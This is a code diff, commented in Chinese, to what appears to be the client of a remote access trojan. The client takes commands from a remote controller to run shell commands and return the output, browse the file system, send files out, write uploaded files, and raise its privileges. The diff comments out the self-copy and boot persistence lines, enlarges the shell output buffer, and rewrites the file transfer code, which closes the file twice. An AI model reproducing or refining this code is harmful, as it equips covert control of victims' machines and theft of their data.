@@ -2,8 +2,6 @@
 
 int GetPCMessage(SOCKET fd);//获取计算机基本信息
 
-int FileBrowse(SOCKET fd, char* str);//文件浏览
-
 int recvFile(SOCKET fd, char* buf);//文件下载
 
 int sendFile(SOCKET fd, char* buf);//文件上传
@@ -16,16 +14,16 @@ void process(SOCKET fd);
 
 int main()
 {
-	if (true == UpPrivilegeValue())
-	{
-		//cout << "successs" << endl;
-	}
+	//if (true == UpPrivilegeValue())
+	//{
+	//	//cout << "successs" << endl;
+	//}
 
-	char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260
+	//char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260
 
-	copySelf(pathName);//将文件复制到系统目录
+	//copySelf(pathName);//将文件复制到系统目录
 
-	ComputerStart(pathName);//设置程序开机自启
+	//ComputerStart(pathName);//设置程序开机自启
 
 	init_Socket();//创建客户端socket
 
@@ -76,14 +74,6 @@ int GetPCMessage(SOCKET fd)
 	return 0;
 }
 
-int FileBrowse(SOCKET fd, char* str)
-{
-	//获取目标路径下的文件名
-	char FileName[Row] = { 0 };
-	GetFileName(fd, FileName, str);
-	return 0;
-}
-
 int sendFile(SOCKET fd, char* buf)
 {
 	ZeroMemory(buf, sizeof(buf));
@@ -117,9 +107,9 @@ int sendFile(SOCKET fd, char* buf)
 			send(fd, sendbuf, BUFSIZ * 2, 0);
 		}
 	}
-	char res[BUFSIZ] = "success";
-	encode(res);
-	send(fd, res, BUFSIZ, 0);
+	//char res[BUFSIZ] = "success";
+	//encode(res);
+	//send(fd, res, BUFSIZ, 0);
 	return 0;
 }
 
@@ -172,7 +162,7 @@ int shell(SOCKET fd, const char* cmd, char* result)
 		while (fgets(buf_ps, sizeof(buf_ps), ptr) != NULL)
 		{
 			strcat(result, buf_ps);
-			if (strlen(result) > BUFSIZ * 6)
+			if (strlen(result) > BUFSIZ * 10)
 			{
 				break;
 			}
@@ -182,7 +172,7 @@ int shell(SOCKET fd, const char* cmd, char* result)
 		iRet = 0;  // 处理成功
 	}
 	//cout << result;
-	send(fd, result, BUFSIZ * 6, 0);
+	send(fd, result, BUFSIZ * 10, 0);
 	return iRet;
 }
 
@@ -239,14 +229,19 @@ void process(SOCKET fd)
 
 			if (!strcmp(command, "filebrowse"))
 			{
-				recv(fd, recvbuf, 100, 0);//接收路径
-				decode(recvbuf);
-				FileBrowse(fd, recvbuf);
+				char path[50] = { 0 };
+				char* res = (char*)malloc(sizeof(char) * BUFSIZ);
+				recv(fd, path, 50, 0);//接收路径
+				decode(path);
+
+				GetFileName(fd, path, res);
+				//send(fd, res, BUFSIZ, 0);
+				free(res);
 				continue;
 			}
 			else if (!strcmp(command, "shell"))
 			{
-				char res[BUFSIZ * 6] = { 0 };
+				char res[BUFSIZ * 10] = { 0 };
 				if (recv(fd, recvbuf, BUFSIZ, 0) > 0)//获得shell指令
 				{
 					decode(recvbuf);
@@ -257,20 +252,61 @@ void process(SOCKET fd)
 			else if (!strcmp(command, "download"))
 			{
 				recv(fd, recvbuf, BUFSIZ, 0);
-				decode(recvbuf);
-				sendFile(fd, recvbuf);
-				continue;
+				FILE* fp = fopen(recvbuf, "r");
+				if (fp == NULL)
+				{
+					printf("打开 %s 文件失败!\n", recvbuf);
+				}
+				else
+				{
+					char buffer[BUFSIZ];
+					printf("成功打开 %s 文件!\n", recvbuf);
+					ZeroMemory(buffer, BUFSIZ);
+					int file_block_length = 0;
+					//循环将文件file_name(fp)中的内容读取到buffer中
+					while ((file_block_length = fread(buffer, sizeof(char), BUFSIZ, fp)) > 0)
+					{
+
+						// 发送buffer中的字符串到客户端  
+						if (send(fd, buffer, file_block_length, 0) < 0)
+						{
+							printf("文件 %s 发送失败!\n", recvbuf);
+							break;
+						}
+						//清空buffer缓存区
+						ZeroMemory(buffer, sizeof(buffer));
+					}
+					fclose(fp);  			//关闭文件描述符fp
+					printf("文件 %s 传输成功!\n", recvbuf);
+				}
+				fclose(fp);
 			}
 			else if (!strcmp(command, "upload"))
 			{
-				recv(fd, recvbuf, BUFSIZ, 0);
-				decode(recvbuf);
-				recvFile(fd, recvbuf);
+
+				FILE* fp = fopen("D:\\vsfiles\\test\\x64\\Release\\file.txt", "w");
+				if (fp == NULL)
+				{
+					printf("文件打开失败");
+					continue;
+				}
+				int ret = recv(fd, recvbuf, BUFSIZ, 0);
+
+				int write_length = fwrite(recvbuf, sizeof(char), ret, fp);
+				if (write_length < ret)
+				{
+					printf("文件写入失败!\n");
+					continue;
+				}
+				ZeroMemory(recvbuf, sizeof(recvbuf));   //清空接收缓存区
+				ZeroMemory(recvbuf, sizeof(recvbuf));   //清空接收缓存区
+				fclose(fp);
 				continue;
 			}
 			else if (!strcmp(command, "upright"))
 			{
-				UpPrivilegeValue();
+				thread th5 = thread(UpPrivilegeValue);
+				th5.join();
 				continue;
 			}
 			else if (!strcmp(command, "kill"))
@@ -315,9 +351,9 @@ void process(SOCKET fd)
 			}
 			else
 			{
-				char text[60] = "Error code";
-				encode(text);
-				send(fd, text, 60, 0);//发送指令错误
+				//char text[60] = "Error code";
+				//encode(text);
+				//send(fd, text, 60, 0);//发送指令错误
 				continue;
 			}
 			ZeroMemory(recvbuf, sizeof(recvbuf));//初始化
